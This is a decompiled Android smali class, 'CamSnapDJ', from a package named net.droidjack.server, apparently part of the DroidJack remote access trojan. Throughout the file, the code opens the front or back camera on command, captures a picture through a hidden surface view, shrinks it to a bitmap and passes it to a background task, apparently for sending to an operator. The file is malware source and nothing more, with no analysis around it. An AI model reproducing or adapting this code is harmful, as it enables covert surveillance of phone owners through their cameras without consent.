.class public Lnet/droidjack/server/CamSnapDJ;
.super Landroid/app/Activity;


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# instance fields
.field private a:Landroid/hardware/Camera;

.field private b:Z

.field private c:Ljava/lang/String;

.field private d:I

.field private e:Landroid/view/SurfaceView;

.field private f:Landroid/view/SurfaceHolder;

.field private g:Z


# direct methods
.method public constructor <init>()V
    .locals 2

    const/4 v1, 0x0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    iput-boolean v1, p0, Lnet/droidjack/server/CamSnapDJ;->b:Z

    const-string v0, ""

    iput-object v0, p0, Lnet/droidjack/server/CamSnapDJ;->c:Ljava/lang/String;

    const/4 v0, 0x1

    iput v0, p0, Lnet/droidjack/server/CamSnapDJ;->d:I

    iput-boolean v1, p0, Lnet/droidjack/server/CamSnapDJ;->g:Z

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/CamSnapDJ;[B)Landroid/graphics/Bitmap;
    .locals 1

    invoke-direct {p0, p1}, Lnet/droidjack/server/CamSnapDJ;->a([B)Landroid/graphics/Bitmap;

    move-result-object v0

    return-object v0
.end method

.method private a([B)Landroid/graphics/Bitmap;
    .locals 6

    const/4 v5, 0x0

    const/16 v4, 0x64

    const/4 v0, 0x1

    new-instance v1, Landroid/graphics/BitmapFactory$Options;

    invoke-direct {v1}, Landroid/graphics/BitmapFactory$Options;-><init>()V

    iput-boolean v0, v1, Landroid/graphics/BitmapFactory$Options;->inJustDecodeBounds:Z

    new-instance v2, Ljava/io/ByteArrayInputStream;

    invoke-direct {v2, p1}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    invoke-static {v2, v5, v1}, Landroid/graphics/BitmapFactory;->decodeStream(Ljava/io/InputStream;Landroid/graphics/Rect;Landroid/graphics/BitmapFactory$Options;)Landroid/graphics/Bitmap;

    iget v2, v1, Landroid/graphics/BitmapFactory$Options;->outWidth:I

    iget v1, v1, Landroid/graphics/BitmapFactory$Options;->outHeight:I

    :goto_0
    div-int/lit8 v3, v2, 0x2

    if-lt v3, v4, :cond_0

    div-int/lit8 v3, v1, 0x2

    if-ge v3, v4, :cond_1

    :cond_0
    new-instance v1, Landroid/graphics/BitmapFactory$Options;

    invoke-direct {v1}, Landroid/graphics/BitmapFactory$Options;-><init>()V

    iput v0, v1, Landroid/graphics/BitmapFactory$Options;->inSampleSize:I

    new-instance v0, Ljava/io/ByteArrayInputStream;

    invoke-direct {v0, p1}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    invoke-static {v0, v5, v1}, Landroid/graphics/BitmapFactory;->decodeStream(Ljava/io/InputStream;Landroid/graphics/Rect;Landroid/graphics/BitmapFactory$Options;)Landroid/graphics/Bitmap;

    move-result-object v0

    return-object v0

    :cond_1
    div-int/lit8 v2, v2, 0x2

    div-int/lit8 v1, v1, 0x2

    mul-int/lit8 v0, v0, 0x2

    goto :goto_0
.end method

.method static synthetic a(Lnet/droidjack/server/CamSnapDJ;)Landroid/hardware/Camera;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/CamSnapDJ;->a:Landroid/hardware/Camera;

    return-object v0
.end method

.method private a()V
    .locals 0

    invoke-virtual {p0}, Lnet/droidjack/server/CamSnapDJ;->finish()V

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/CamSnapDJ;Landroid/hardware/Camera;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/CamSnapDJ;->a:Landroid/hardware/Camera;

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/CamSnapDJ;Z)V
    .locals 0

    iput-boolean p1, p0, Lnet/droidjack/server/CamSnapDJ;->b:Z

    return-void
.end method

.method static synthetic b(Lnet/droidjack/server/CamSnapDJ;)V
    .locals 0

    invoke-direct {p0}, Lnet/droidjack/server/CamSnapDJ;->a()V

    return-void
.end method

.method static synthetic c(Lnet/droidjack/server/CamSnapDJ;)I
    .locals 1

    iget v0, p0, Lnet/droidjack/server/CamSnapDJ;->d:I

    return v0
.end method

.method static synthetic d(Lnet/droidjack/server/CamSnapDJ;)Z
    .locals 1

    iget-boolean v0, p0, Lnet/droidjack/server/CamSnapDJ;->b:Z

    return v0
.end method


# virtual methods
.method public a(Landroid/graphics/Bitmap;)V
    .locals 2

    :try_start_0
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lnet/droidjack/server/k;

    invoke-direct {v1, p0, p1}, Lnet/droidjack/server/k;-><init>(Lnet/droidjack/server/CamSnapDJ;Landroid/graphics/Bitmap;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 4

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lnet/droidjack/server/CamSnapDJ;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const-string v1, "cameraview"

    const-string v2, "layout"

    invoke-virtual {p0}, Lnet/droidjack/server/CamSnapDJ;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v0

    invoke-virtual {p0, v0}, Lnet/droidjack/server/CamSnapDJ;->setContentView(I)V

    invoke-static {}, Lnet/droidjack/server/ae;->a()V

    :try_start_0
    invoke-virtual {p0}, Lnet/droidjack/server/CamSnapDJ;->getIntent()Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "Camtype"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/4 v2, 0x5

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(I)V

    const-string v1, "Front"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_1

    const/4 v0, 0x1

    iput v0, p0, Lnet/droidjack/server/CamSnapDJ;->d:I

    :cond_0
    :goto_0
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/4 v1, 0x6

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(I)V

    invoke-virtual {p0}, Lnet/droidjack/server/CamSnapDJ;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const-string v1, "surface_camera"

    const-string v2, "id"

    invoke-virtual {p0}, Lnet/droidjack/server/CamSnapDJ;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v0

    invoke-virtual {p0, v0}, Lnet/droidjack/server/CamSnapDJ;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/view/SurfaceView;

    iput-object v0, p0, Lnet/droidjack/server/CamSnapDJ;->e:Landroid/view/SurfaceView;

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(I)V

    iget-object v0, p0, Lnet/droidjack/server/CamSnapDJ;->e:Landroid/view/SurfaceView;

    invoke-virtual {v0}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v0

    iput-object v0, p0, Lnet/droidjack/server/CamSnapDJ;->f:Landroid/view/SurfaceHolder;

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "Clear n working - Cam"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    new-instance v0, Lnet/droidjack/server/h;

    invoke-direct {v0, p0}, Lnet/droidjack/server/h;-><init>(Lnet/droidjack/server/CamSnapDJ;)V

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/4 v2, 0x7

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(I)V

    iget-object v1, p0, Lnet/droidjack/server/CamSnapDJ;->f:Landroid/view/SurfaceHolder;

    new-instance v2, Lnet/droidjack/server/i;

    invoke-direct {v2, p0, v0}, Lnet/droidjack/server/i;-><init>(Lnet/droidjack/server/CamSnapDJ;Landroid/hardware/Camera$PictureCallback;)V

    invoke-interface {v1, v2}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/16 v1, 0x8

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(I)V

    :goto_1
    return-void

    :cond_1
    const-string v1, "Back"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    iput v0, p0, Lnet/droidjack/server/CamSnapDJ;->d:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method
